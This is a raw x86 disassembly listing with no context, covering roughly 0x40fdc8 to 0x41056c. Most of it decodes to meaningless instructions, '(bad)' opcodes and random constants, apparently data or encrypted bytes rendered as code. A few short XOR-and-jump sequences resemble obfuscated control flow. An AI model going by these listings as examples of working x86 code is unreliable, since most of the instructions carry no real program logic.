  40fdc8:	and    eax,0xb3c0d871
  40fdcd:	add    eax,0x7d9119e3
  40fdd2:	sbb    eax,0x5aaad823
  40fdd7:	(bad)  
  40fdd8:	sbb    eax,DWORD PTR [ebx+0x4b]
  40fddb:	or     al,0xb3
  40fddd:	jp     0x40fdd6
  40fddf:	and    DWORD PTR [edx],0x37dbe88b
  40fde5:	call   0x129c:0xbb53133f
  40fdec:	clc    
  40fded:	test   eax,0x93a53a54
  40fdf2:	nop
  40fdf3:	xor    dl,dl
  40fdf5:	cmp    eax,0x6daf2cda
  40fdfa:	stc    
  40fdfb:	aam    0x14
  40fdfd:	push   ds
  40fdfe:	pop    esi
  40fdff:	sbb    al,BYTE PTR [ecx-0x69e92e5c]
  40fe05:	ret    
  40fe06:	xchg   esp,eax
  40fe07:	loopne 0x40fe30
  40fe09:	jb     0x40fde8
  40fe0b:	leave  
  40fe0c:	jnp    0x40fe42
  40fe0e:	cld    
  40fe0f:	xor    al,0x7d
  40fe11:	sub    DWORD PTR [ebx-0xce2b8d6],esp
  40fe17:	mov    eax,0xf920caef
  40fe1c:	sbb    BYTE PTR [esi-0x39],al
  40fe1f:	int    0xde
  40fe21:	std    
  40fe22:	xor    edx,DWORD PTR [edi-0x6b29d6c7]
  40fe28:	or     al,0xa4
  40fe2a:	or     DWORD PTR [edi-0x18c2bd1e],ebx
  40fe30:	or     BYTE PTR [ebx],0x10
  40fe33:	push   ebx
  40fe34:	mov    edx,edi
  40fe36:	cli    
  40fe37:	push   es
  40fe38:	cmp    ch,dl
  40fe3a:	adc    DWORD PTR ds:0x9b431c52,esp
  40fe40:	push   eax
  40fe41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe42:	pop    ebp
  40fe43:	inc    edx
  40fe44:	mov    ebp,0x2908968f
  40fe49:	nop
  40fe4a:	push   ds
  40fe4b:	cld    
  40fe4c:	xchg   edi,eax
  40fe4d:	in     al,dx
  40fe4e:	pop    esi
  40fe4f:	add    dh,bh
  40fe51:	jmp    0x9402:0x2f3aa03a
  40fe58:	mov    dl,0xad
  40fe5a:	push   0xffffffc1
  40fe5c:	sar    BYTE PTR [edi-0x1c2e7b56],0x40
  40fe63:	into   
  40fe64:	aam    0xae
  40fe66:	fdivrp st(5),st
  40fe68:	retf   0xeaaf
  40fe6b:	mov    bh,0x19
  40fe6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6e:	mov    edi,0x6d17ba54
  40fe73:	xchg   esi,eax
  40fe74:	ror    DWORD PTR [ebx],0xf
  40fe77:	data16 add BYTE PTR [ecx],0x54
  40fe7b:	xor    DWORD PTR [edx],ecx
  40fe7d:	out    dx,eax
  40fe7e:	jmp    0x40fec3
  40fe80:	adc    al,0x21
  40fe82:	fidivr WORD PTR [ecx]
  40fe84:	pop    ds
  40fe85:	pusha  
  40fe86:	out    0x24,eax
  40fe88:	jne    0x40fef7
  40fe8a:	mov    ecx,0x2c638d5
  40fe8f:	pop    ebp
  40fe90:	or     ecx,DWORD PTR [ecx]
  40fe92:	data16 (bad) 
  40fe94:	aas    
  40fe95:	sub    al,0x8c
  40fe97:	int3   
  40fe98:	loopne 0x40fef8
  40fe9a:	mov    esi,0xeb116e53
  40fe9f:	jle    0x40feef
  40fea1:	xchg   ebp,ebp
  40fea3:	push   ds
  40fea4:	mov    ah,0xd7
  40fea6:	jo     0x40fe35
  40fea8:	jb     0x40feb7
  40feaa:	sub    esi,DWORD PTR [esi+ebp*2]
  40fead:	sbb    DWORD PTR [ecx],ecx
  40feaf:	add    esi,DWORD PTR [ecx+0x4905ee6e]
  40feb5:	xor    eax,DWORD PTR [ebx]
  40feb7:	push   edi
  40feb8:	(bad)  
  40feba:	jb     0x40ff39
  40febc:	(bad)  
  40febd:	xchg   edx,eax
  40febe:	iret   
  40febf:	(bad)  
  40fec0:	pop    edx
  40fec1:	ret    0x36eb
  40fec4:	inc    ebp
  40fec5:	sub    ch,al
  40fec7:	cmp    al,BYTE PTR [edi]
  40fec9:	scas   eax,DWORD PTR es:[edi]
  40feca:	dec    ebp
  40fecb:	dec    eax
  40fecc:	cs int3 
  40fece:	out    0x19,eax
  40fed0:	in     al,0xc
  40fed2:	mov    cl,0xc5
  40fed4:	sub    ch,dl
  40fed6:	pop    ss
  40fed7:	sar    eax,cl
  40fed9:	in     al,0x24
  40fedb:	jl     0x40fec1
  40fedd:	or     edx,DWORD PTR [eax-0x56]
  40fee0:	pop    esi
  40fee1:	fsub   DWORD PTR [eax+ecx*2-0x36]
  40fee5:	rcl    DWORD PTR [ebx-0x15],1
  40fee8:	xchg   edx,eax
  40fee9:	xchg   ebp,eax
  40feea:	inc    ebx
  40feeb:	pop    esi
  40feec:	dec    esp
  40feed:	mov    eax,0x91547811
  40fef2:	xor    BYTE PTR [ecx],0xbd
  40fef5:	xchg   sp,ax
  40fef7:	add    dl,bl
  40fef9:	push   0x7c5c8a0f
  40fefe:	scas   al,BYTE PTR es:[edi]
  40feff:	xor    ebp,esi
  40ff01:	and    BYTE PTR [ebx-0x976cd4f],bl
  40ff07:	sub    al,0x7b
  40ff09:	pop    edx
  40ff0a:	lods   eax,DWORD PTR ds:[esi]
  40ff0b:	ret    0x7079
  40ff0e:	push   edx
  40ff0f:	rcl    DWORD PTR [ecx-0x6e],0x26
  40ff13:	out    dx,eax
  40ff14:	pop    esi
  40ff15:	loop   0x40fec7
  40ff17:	and    eax,0x26bc808
  40ff1c:	lock jle 0x40fecc
  40ff1f:	adc    ah,BYTE PTR [edx-0x20]
  40ff22:	mov    DWORD PTR [ebx],ecx
  40ff24:	sbb    al,BYTE PTR [ecx+0x5c51cbf3]
  40ff2a:	das    
  40ff2b:	dec    ecx
  40ff2c:	dec    ecx
  40ff2d:	sub    BYTE PTR ds:0x98318ca3,al
  40ff33:	mov    WORD PTR [ecx+eax*4-0x7de0cdb6],cs
  40ff3a:	lods   eax,DWORD PTR ds:[esi]
  40ff3b:	fs jecxz 0x40ff0e
  40ff3e:	xchg   ebp,eax
  40ff3f:	mov    ds:0xb24db6dc,eax
  40ff44:	sub    eax,0x4cc9f42d
  40ff49:	ja     0x40ff44
  40ff4b:	xor    bh,bl
  40ff4d:	clc    
  40ff4e:	jb     0x40ff58
  40ff50:	bound  ebp,QWORD PTR [ebx+0x79]
  40ff53:	out    0x3b,al
  40ff55:	fnsave [esi+0x20]
  40ff58:	int3   
  40ff59:	repz shl BYTE PTR [ebx-0x46],cl
  40ff5d:	test   DWORD PTR [eax],esp
  40ff5f:	cmp    esp,ebp
  40ff61:	push   0xb47b1267
  40ff66:	lahf   
  40ff67:	and    BYTE PTR [esi-0x15e4ad94],cl
  40ff6d:	ja     0x40fef0
  40ff6f:	bound  ebp,QWORD PTR [eax+0x102fabd5]
  40ff75:	pop    esp
  40ff76:	not    BYTE PTR [ebp-0x5d209abe]
  40ff7c:	lock fcmovu st,st(3)
  40ff7f:	stos   DWORD PTR es:[edi],eax
  40ff80:	cmp    eax,0x7933425c
  40ff85:	add    al,0xe
  40ff87:	aad    0x22
  40ff89:	mov    edi,0x17799bf5
  40ff8e:	ret    0x97a0
  40ff91:	mov    bl,0x99
  40ff93:	pusha  
  40ff94:	push   edx
  40ff95:	push   0x41f31ae5
  40ff9a:	xchg   esp,eax
  40ff9b:	call   0x9ebe7581
  40ffa0:	test   BYTE PTR [edx-0x57],dh
  40ffa3:	test   BYTE PTR [edi+ecx*8+0x4a],0x12
  40ffa8:	pop    es
  40ffa9:	xchg   ecx,eax
  40ffaa:	pop    esp
  40ffab:	ds add al,0x4
  40ffae:	sahf   
  40ffaf:	jns    0x40ff5f
  40ffb1:	jno    0x40ff33
  40ffb3:	sub    ch,BYTE PTR [ebp+0x1f40af08]
  40ffb9:	inc    ecx
  40ffba:	mov    edi,0xc322dd3c
  40ffbf:	mov    dh,0x5b
  40ffc1:	xchg   ecx,eax
  40ffc2:	xor    BYTE PTR [edi+0x1e9fe02],ah
  40ffc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffc9:	and    al,0xad
  40ffcc:	daa    
  40ffcd:	dec    eax
  40ffce:	aaa    
  40ffcf:	cmc    
  40ffd0:	adc    al,0x40
  40ffd2:	stos   DWORD PTR es:[edi],eax
  40ffd3:	xor    bh,BYTE PTR [esi+0x67592f44]
  40ffd9:	push   0x4d44ccf2
  40ffde:	popa   
  40ffdf:	push   eax
  40ffe0:	add    edi,DWORD PTR [edx+0x7a]
  40ffe3:	fs std 
  40ffe5:	jne    0x40ffc4
  40ffe7:	jo     0x410016
  40ffe9:	es clc 
  40ffeb:	int    0x1b
  40ffed:	jno    0x41001b
  40ffef:	rcr    BYTE PTR [edx],1
  40fff1:	add    BYTE PTR [edx+0x480fcd19],0x66
  40fff8:	xchg   DWORD PTR [ebx],esi
  40fffa:	push   ebp
  40fffb:	mov    eax,0xd43f0719
  410000:	icebp  
  410001:	pop    ss
  410002:	jb     0x40ffc2
  410004:	mov    eax,0x1f8eea61
  410009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41000a:	idiv   BYTE PTR [ecx+0x1265de58]
  410010:	fidiv  WORD PTR ss:[edi-0x7b052159]
  410017:	daa    
  410018:	jg     0x40ffbc
  41001a:	mov    DWORD PTR [ecx-0x4fdb0953],ebx
  410020:	jbe    0x410099
  410022:	jg     0x410033
  410024:	fiadd  WORD PTR [edi+0xe235dfe]
  41002a:	(bad)  
  41002b:	gs mov edi,0x5f62e047
  410031:	inc    ebp
  410032:	mov    ebx,DWORD PTR [ebp-0x10]
  410035:	sub    ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	and    ebp,ecx
  41006a:	pop    ds
  41006b:	pop    ds
  41006c:	out    0x48,eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	leave  
  410075:	cmp    ah,dh
  410077:	loopne 0x410052
  410079:	(bad)  
  41007a:	mov    ebp,0x5f12993f
  41007f:	pop    ss
  410080:	pop    esp
  410081:	clc    
  410082:	inc    edi
  410083:	fild   WORD PTR [ecx-0x7dc94148]
  410089:	pop    ds
  41008a:	jns    0x41006e
  41008c:	pop    eax
  41008d:	imul   ebp,DWORD PTR [edi-0x5598cb91],0x61
  410094:	push   ds
  410095:	push   ss
  410096:	rcl    BYTE PTR gs:[eax+eiz*8],1
  41009a:	pop    es
  41009b:	xchg   al,dh
  41009d:	push   cs
  41009e:	in     al,0x8a
  4100a0:	fistp  WORD PTR [edi-0x76]
  4100a3:	and    edi,DWORD PTR [eax]
  4100a5:	inc    edx
  4100a6:	pop    es
  4100a7:	cwde   
  4100a8:	fbld   TBYTE PTR [esi+0x65a458b1]
  4100ae:	push   0x26
  4100b0:	mov    esp,gs
  4100b2:	test   BYTE PTR [edx-0x67],dl
  4100b5:	fild   QWORD PTR [ecx+eax*4]
  4100b8:	pop    ds
  4100b9:	pop    esp
  4100ba:	push   edi
  4100bb:	pop    ds
  4100bc:	test   al,0x1d
  4100be:	dec    esi
  4100bf:	xor    ch,ah
  4100c1:	out    dx,eax
  4100c2:	xchg   ecx,eax
  4100c3:	cmc    
  4100c4:	mov    bh,0xb3
  4100c6:	loope  0x4100c5
  4100c8:	ins    DWORD PTR es:[edi],dx
  4100c9:	xor    ecx,DWORD PTR [ecx]
  4100cb:	push   cs
  4100cc:	pop    eax
  4100cd:	lahf   
  4100ce:	les    esi,FWORD PTR [ebp-0x240588ec]
  4100d4:	in     eax,0xcf
  4100d6:	test   al,0xb5
  4100d8:	rcr    DWORD PTR [eax],1
  4100da:	push   cs
  4100db:	lahf   
  4100dc:	in     eax,dx
  4100dd:	or     BYTE PTR [esi+0x20],0x12
  4100e1:	inc    edi
  4100e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100e3:	push   cs
  4100e4:	cld    
  4100e5:	xchg   esi,eax
  4100e6:	loop   0x41013d
  4100e8:	js     0x410131
  4100ea:	gs dec esp
  4100ec:	and    eax,0xef8ef07f
  4100f1:	fidiv  DWORD PTR [ebx-0x2]
  4100f4:	das    
  4100f5:	je     0x4100ed
  4100f7:	loope  0x41008c
  4100f9:	xor    ecx,DWORD PTR [ebx+0x35278a6c]
  4100ff:	adc    DWORD PTR [ecx],esp
  410101:	sub    al,0x74
  410103:	sti    
  410104:	mov    es,WORD PTR [ebx+0x51d335b1]
  41010a:	test   DWORD PTR [edx-0x79],edx
  41010d:	cs in  eax,dx
  41010f:	xchg   ebp,eax
  410110:	pop    es
  410111:	push   ebx
  410112:	jne    0x4100f2
  410114:	adc    eax,0x4bf0b69e
  410119:	sbb    DWORD PTR [esi+0x65],0xfabfce17
  410120:	repnz mov eax,0x9e82ee70
  410126:	inc    ebx
  410127:	imul   ecx,esi,0x48d59fdb
  41012d:	cmc    
  41012e:	xchg   ebx,eax
  41012f:	sub    ch,BYTE PTR [esi-0x36]
  410132:	fnstenv [eax+edi*1+0x27]
  410136:	jge    0x410145
  410138:	sub    ah,BYTE PTR [edx+0x21]
  41013b:	lds    ebx,FWORD PTR [ecx-0x1e]
  41013e:	imul   ecx,DWORD PTR [ebx+0x2c],0x30
  410142:	in     al,0x9d
  410144:	cs es jne 0x4100d8
  410148:	out    dx,al
  410149:	push   esi
  41014a:	outs   dx,DWORD PTR ds:[esi]
  41014b:	loop   0x4100d9
  41014d:	js     0x410126
  41014f:	fs cwde 
  410151:	fs add edi,0xffffff8d
  410155:	out    dx,eax
  410156:	add    eax,0xb3de16cb
  41015b:	inc    ebx
  41015c:	in     eax,0xd5
  41015e:	adc    al,0x88
  410160:	add    eax,0xf12c1a5a
  410165:	fbstp  TBYTE PTR [ecx]
  410167:	push   ecx
  410168:	sub    BYTE PTR [bx+si+0xd],ah
  41016c:	xor    eax,0x5d0e4eca
  410171:	pop    es
  410172:	nop
  410173:	push   esp
  410174:	jnp    0x410179
  410176:	stos   DWORD PTR es:[edi],eax
  410177:	in     eax,0xc0
  410179:	inc    ebp
  41017a:	push   0xffffff91
  41017c:	repz sbb ch,BYTE PTR [eax+0x4a]
  410180:	jo     0x4101f9
  410182:	sti    
  410183:	mov    ecx,0x5efed5f0
  410188:	add    DWORD PTR [edx*1+0x330c89c4],0xa428ec8a
  410193:	adc    esi,DWORD PTR [edx-0x51]
  410196:	mov    bl,0xc3
  410198:	sub    al,0x22
  41019a:	cmp    al,0x25
  41019c:	sub    eax,0x675d752
  4101a1:	and    ebx,DWORD PTR [esi]
  4101a3:	jecxz  0x4101ff
  4101a5:	xchg   edi,eax
  4101a6:	enter  0x2242,0x31
  4101aa:	sbb    al,0x49
  4101ac:	xchg   BYTE PTR [ecx],ch
  4101ae:	dec    edx
  4101af:	aam    0x48
  4101b1:	(bad)  
  4101b3:	jge    0x41014d
  4101b5:	retf   0xaa3
  4101b8:	xlat   BYTE PTR ds:[ebx]
  4101b9:	icebp  
  4101ba:	mov    eax,esi
  4101bc:	mov    dh,0x6c
  4101be:	push   edi
  4101bf:	mov    WORD PTR [ebp-0x3e],es
  4101c2:	jae    0x410217
  4101c4:	mov    cl,0xb0
  4101c6:	shl    BYTE PTR [ecx],1
  4101c8:	cmp    al,0x75
  4101ca:	push   cs
  4101cb:	mov    ds:0xa9abffd7,eax
  4101d0:	ror    BYTE PTR [ecx],1
  4101d2:	mov    eax,0xaa2bf454
  4101d7:	pop    es
  4101d8:	push   ds
  4101d9:	neg    BYTE PTR [edi]
  4101db:	jl     0x4101fa
  4101dd:	push   ss
  4101de:	sar    DWORD PTR [ecx+0x55],0xc
  4101e2:	jmp    0x41023c
  4101e4:	jno    0x4101b6
  4101e6:	pop    ecx
  4101e7:	dec    esp
  4101e8:	mov    al,0xf3
  4101ea:	and    edx,DWORD PTR [edx-0x53]
  4101ed:	rep stos DWORD PTR es:[edi],eax
  4101ef:	mov    dl,0x41
  4101f1:	js     0x41021c
  4101f3:	dec    esi
  4101f4:	adc    bh,bl
  4101f6:	in     eax,0x5e
  4101f8:	rol    DWORD PTR [eax],1
  4101fa:	mov    edx,0x9443c9da
  4101ff:	xchg   edi,eax
  410200:	pop    ecx
  410201:	or     edi,ebx
  410203:	cmc    
  410204:	add    al,0x86
  410206:	cmp    al,0x6b
  410208:	mov    bl,0xa0
  41020a:	hlt    
  41020b:	jb     0x4101e0
  41020d:	retf   0x6b6
  410210:	mov    edx,DWORD PTR [ecx]
  410212:	loope  0x410286
  410214:	dec    ebp
  410215:	mov    ebp,0x2081f4f0
  41021a:	lods   al,BYTE PTR ds:[esi]
  41021b:	mov    ds:0x10142c03,al
  410220:	mov    ds:0xb3c63007,al
  410225:	dec    edx
  410226:	pop    esi
  410227:	jnp    0x410239
  410229:	mov    eax,0xefc72cb8
  41022e:	ficom  DWORD PTR [esi]
  410230:	(bad)  
  410231:	fist   DWORD PTR [ebx+edx*4+0x1f]
  410235:	dec    esp
  410236:	ret    0xaf22
  410239:	and    ebx,DWORD PTR [ecx]
  41023b:	mov    bh,dh
  41023d:	int3   
  41023e:	fwait
  41023f:	aas    
  410240:	(bad)  
  410241:	cmp    al,0x59
  410243:	sub    ebx,eax
  410245:	and    eax,0xfcbed6a1
  41024a:	lock pop ebx
  41024c:	mov    ecx,0x8db24fc6
  410251:	cmp    edx,eax
  410253:	sbb    eax,0x522a8f56
  410258:	data16 adc al,0xa2
  41025b:	cmp    edx,0x4c
  41025e:	mov    WORD PTR [ebx+eax*1-0x378d634e],?
  410265:	cs pop edi
  410267:	pop    ebx
  410268:	mov    edi,0x9482209d
  41026d:	push   0x55c741d4
  410272:	sbb    bh,cl
  410274:	ret    
  410275:	mov    esi,0x6fde972f
  41027a:	jo     0x41021c
  41027c:	push   esi
  41027d:	pop    ebp
  41027e:	hlt    
  41027f:	neg    BYTE PTR ds:0xf2f2941d
  410285:	aaa    
  410286:	(bad)  
  410287:	test   esp,edx
  410289:	mov    ebp,0xf84450fa
  41028e:	xchg   ebx,eax
  41028f:	adc    eax,0x16c83fd6
  410294:	xor    edi,DWORD PTR [edi+0x19]
  410297:	ret    
  410298:	dec    edi
  410299:	inc    ebp
  41029a:	sbb    eax,0xdf19be87
  41029f:	loop   0x41029e
  4102a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102a2:	add    DWORD PTR [esi+0x7a],ebp
  4102a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102a6:	nop
  4102a7:	or     BYTE PTR [eax-0x4c],dh
  4102aa:	call   DWORD PTR [edx+esi*1]
  4102ad:	test   al,0x5a
  4102af:	ss jne 0x410329
  4102b2:	xlat   BYTE PTR ds:[ebx]
  4102b3:	loop   0x410252
  4102b5:	inc    edx
  4102b6:	pop    ebp
  4102b7:	mov    ch,BYTE PTR [esi]
  4102b9:	lods   al,BYTE PTR ds:[esi]
  4102ba:	xor    BYTE PTR ds:[ebp+edx*4+0x3cbd18b0],cl
  4102c2:	stc    
  4102c3:	test   DWORD PTR ds:0xdec327fa,eax
  4102c9:	pop    esp
  4102ca:	add    al,0x88
  4102cc:	mov    ch,0xde
  4102ce:	nop
  4102cf:	ds push edi
  4102d1:	outs   dx,DWORD PTR ds:[esi]
  4102d2:	and    al,0x5d
  4102d4:	enter  0x73f4,0x48
  4102d8:	cli    
  4102d9:	imul   edi,DWORD PTR [ecx],0x45
  4102dc:	push   ecx
  4102dd:	push   esp
  4102de:	cdq    
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	neg    dl
  4102f4:	mov    WORD PTR [eax+0x4c],gs
  4102f7:	dec    esi
  4102f8:	js     0x410372
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	sub    eax,0x2bad05c4
  410303:	mov    ch,bl
  410305:	inc    esp
  410306:	out    0x8f,eax
  410308:	add    eax,0x8bc69aa7
  41030d:	ds scas al,BYTE PTR es:[edi]
  41030f:	loop   0x410304
  410311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410312:	(bad)  
  410313:	cs stc 
  410315:	imul   eax,DWORD PTR [ecx+ecx*1],0x8011d485
  41031c:	shl    BYTE PTR [eax],1
  41031e:	aad    0xc9
  410320:	out    0x34,al
  410322:	inc    esp
  410323:	cmp    DWORD PTR [ebx+edi*2-0x4b],edx
  410327:	pusha  
  410328:	stos   BYTE PTR es:[edi],al
  410329:	daa    
  41032a:	xchg   esi,eax
  41032b:	fiadd  WORD PTR [eax+0x31c5bd93]
  410331:	cmp    cl,BYTE PTR [eax+ecx*8-0x19]
  410335:	jmp    0x7a4b76a2
  41033a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41033b:	mov    eax,0x37f33128
  410340:	out    0xd4,eax
  410342:	test   al,0x70
  410344:	lds    edx,FWORD PTR [ebx-0x5e]
  410347:	jmp    0x4103aa
  410349:	(bad)  
  41034b:	into   
  41034c:	leave  
  41034d:	mov    ebp,0xa373b7cd
  410352:	fld    TBYTE PTR [edx+0x2d5fcca3]
  410358:	addr16 (bad) 
  41035a:	or     al,ah
  41035c:	shl    BYTE PTR [ebx],0x3a
  41035f:	pop    ebx
  410360:	iret   
  410361:	hlt    
  410362:	jbe    0x4103a4
  410364:	push   esi
  410365:	sbb    al,0x56
  410367:	jo     0x41036c
  410369:	pop    edi
  41036a:	cdq    
  41036b:	out    dx,al
  41036c:	sbb    BYTE PTR [eax-0x464a5f54],ah
  410372:	xor    al,0x97
  410374:	sub    al,0xbb
  410376:	mov    bl,0x86
  410378:	addr16 jo 0x410336
  41037b:	or     BYTE PTR [esi+ebp*2-0x10],0xab
  410380:	xchg   edi,eax
  410381:	push   es
  410382:	cdq    
  410383:	mov    edx,0xe35587
  410388:	mov    al,bh
  41038a:	mov    ah,0x3f
  41038c:	lahf   
  41038d:	and    al,0xd4
  41038f:	lahf   
  410390:	or     al,0x23
  410392:	push   0x85482355
  410397:	rcr    BYTE PTR [esi-0xe],1
  41039a:	repz frstpm(287 only) 
  41039d:	mov    BYTE PTR [ebx+0x793b3c42],cl
  4103a3:	inc    esp
  4103a4:	inc    ebx
  4103a5:	push   0x65b55bb2
  4103aa:	jne    0x4103d3
  4103ac:	int3   
  4103ad:	call   0xe8c85374
  4103b2:	push   ebx
  4103b3:	dec    eax
  4103b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103b5:	icebp  
  4103b6:	repnz pop ebp
  4103b8:	fs jnp 0x410359
  4103bb:	retf   
  4103bc:	jecxz  0x41038d
  4103be:	xchg   ebp,eax
  4103bf:	add    BYTE PTR [esi+eax*1+0x21],ch
  4103c3:	pop    ds
  4103c4:	aad    0xf
  4103c6:	fistp  WORD PTR [edi+0x43]
  4103c9:	popf   
  4103ca:	addr16 out dx,eax
  4103cc:	js     0x410416
  4103ce:	jge    0x4103ff
  4103d0:	mov    edi,0x8a97deb6
  4103d5:	es xchg ebp,eax
  4103d7:	or     edx,esi
  4103d9:	repnz lods eax,DWORD PTR ds:[esi]
  4103db:	cmp    DWORD PTR [edx+0x1c],ebx
  4103de:	pop    ebp
  4103df:	mov    ah,0xcb
  4103e1:	ss inc edi
  4103e3:	jae    0x410374
  4103e5:	in     eax,0x4b
  4103e7:	out    dx,al
  4103e8:	(bad)  
  4103e9:	bound  esp,QWORD PTR [eax-0x47]
  4103ec:	xor    al,0x89
  4103ee:	mov    ds:0xb00847b7,eax
  4103f3:	sub    eax,0xaa5c1353
  4103f8:	jno    0x41041a
  4103fa:	inc    ebp
  4103fb:	mov    ds:0xf84cccf1,eax
  410400:	mov    ebx,0xba2893dd
  410405:	xor    al,0xe0
  410407:	sbb    eax,0x8c9a6b17
  41040c:	fs scas eax,DWORD PTR es:[edi]
  41040e:	in     eax,dx
  41040f:	add    al,0x94
  410411:	popa   
  410412:	xor    ebx,esp
  410414:	fisttp WORD PTR [esi-0x3111afbd]
  41041a:	ja     0x410437
  41041c:	out    dx,eax
  41041d:	lea    esi,[eax]
  41041f:	ret    0x59a9
  410422:	sbb    esp,DWORD PTR [edi+0x7c]
  410425:	pop    ebx
  410426:	scas   al,BYTE PTR es:[edi]
  410427:	or     DWORD PTR [bp+di-0x72],edx
  41042b:	pop    esi
  41042c:	cli    
  41042d:	push   es
  41042e:	outs   dx,DWORD PTR ds:[esi]
  41042f:	cmp    al,0xe6
  410431:	fimul  WORD PTR [ecx-0x36]
  410434:	push   ebp
  410435:	fimul  DWORD PTR [ebx]
  410437:	cwde   
  410438:	or     al,al
  41043a:	jnp    0x4103ef
  41043c:	xchg   ebx,eax
  41043d:	xor    DWORD PTR [ebp+0x6f546030],ebx
  410443:	fsubr  QWORD PTR [eax]
  410445:	xchg   esp,eax
  410446:	arpl   ax,ax
  410448:	lahf   
  410449:	push   edi
  41044a:	dec    edi
  41044b:	mov    al,0xcd
  41044d:	loope  0x4104c2
  41044f:	(bad)  
  410450:	in     al,dx
  410451:	js     0x410462
  410453:	call   0x7be7fdea
  410458:	call   0x1df9:0x1a22f5be
  41045f:	cs ret 
  410461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410462:	mov    al,ds:0xa414f7ce
  410467:	cmp    edx,esi
  410469:	fcom   DWORD PTR [ebx+ebx*2+0x7682750b]
  410470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410471:	in     eax,0x60
  410473:	inc    eax
  410474:	dec    esi
  410475:	mov    esp,0x3521dd2f
  41047a:	add    al,BYTE PTR ds:0xe5ffed5d
  410480:	push   ds
  410481:	push   eax
  410482:	(bad)  
  410483:	loopne 0x4104bb
  410485:	ins    BYTE PTR es:[edi],dx
  410486:	and    esp,edi
  410488:	and    dh,0xcb
  41048b:	inc    esp
  41048c:	inc    esi
  41048d:	ins    DWORD PTR es:[edi],dx
  41048e:	ror    DWORD PTR [esi],cl
  410490:	imul   ebp,DWORD PTR [edx],0x4d
  410493:	xor    al,0xa8
  410495:	inc    ebx
  410496:	cwde   
  410497:	inc    edx
  410498:	mov    esp,0x2fd38263
  41049d:	daa    
  41049e:	imul   edx,DWORD PTR cs:[ecx-0x7ba9a240],0x77393f3f
  4104a9:	sbb    BYTE PTR [ebx+0x2],ah
  4104ac:	sbb    al,0xa0
  4104ae:	nop
  4104af:	mov    WORD PTR ds:0xa6007515,cs
  4104b5:	and    eax,0x59e4dc69
  4104ba:	subps  xmm0,XMMWORD PTR [edi+0xc47597e]
  4104c1:	pop    ebx
  4104c2:	das    
  4104c3:	in     eax,dx
  4104c4:	mov    DWORD PTR [ebp-0x57],esp
  4104c7:	adc    al,0xe1
  4104c9:	gs sti 
  4104cb:	push   eax
  4104cc:	inc    ecx
  4104cd:	xchg   BYTE PTR [ecx+0x1316372e],bh
  4104d3:	sbb    DWORD PTR ds:0xc638f587,ebx
  4104d9:	cli    
  4104da:	adc    DWORD PTR [edi+edx*2+0x6e5310b4],0x1181e075
  4104e5:	cmc    
  4104e6:	shl    DWORD PTR [edi],cl
  4104e8:	jb     0x41052f
  4104ea:	mov    ecx,0x66edca15
  4104ef:	mov    dh,0xd4
  4104f1:	push   edx
  4104f2:	mov    ebp,ecx
  4104f4:	dec    edi
  4104f5:	in     eax,dx
  4104f6:	aam    0x6
  4104f8:	leave  
  4104f9:	dec    ecx
  4104fa:	clc    
  4104fb:	imul   ebp,DWORD PTR [edi+0x54ca352d],0x65
  410502:	aad    0x29
  410504:	or     edx,DWORD PTR [esi]
  410506:	fild   WORD PTR [ecx+0x4f5c15e9]
  41050c:	pusha  
  41050d:	cld    
  41050e:	out    dx,eax
  41050f:	xchg   BYTE PTR [eax],dl
  410511:	lods   al,BYTE PTR ds:[esi]
  410512:	push   ss
  410513:	aam    0x5d
  410515:	sub    al,BYTE PTR [edx]
  410517:	xor    esi,esp
  410519:	test   DWORD PTR [edi-0x4f],edx
  41051c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41051d:	mov    eax,0xd8ea99ca
  410522:	out    dx,eax
  410523:	lds    ebp,FWORD PTR [edx+0x52]
  410526:	data16 sbb al,0xcd
  410529:	nop
  41052a:	mov    ecx,0x66b781f9
  41052f:	add    eax,0xbde018ed
  410534:	dec    ecx
  410535:	mov    ebx,0xc2f37c8
  41053a:	xor    esp,DWORD PTR [ecx-0x5c1e0597]
  410540:	daa    
  410541:	(bad)  [ebp-0x41881f62]
  410547:	rcl    BYTE PTR [esi],1
  410549:	cwde   
  41054a:	cmp    ecx,DWORD PTR [eax]
  41054c:	faddp  st(6),st
  41054e:	repnz pop ebx
  410550:	pushf  
  410551:	sub    BYTE PTR [edi],ah
  410553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410554:	std    
  410555:	xor    eax,0x8c305e1
  41055a:	adc    eax,0xccf6283d
  41055f:	inc    ecx
  410560:	xchg   ebp,eax
  410561:	aas    
  410562:	(bad)  
  410563:	rcl    DWORD PTR [edi+edx*4],cl
  410566:	mov    ?,WORD PTR [ecx+eiz*1]
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
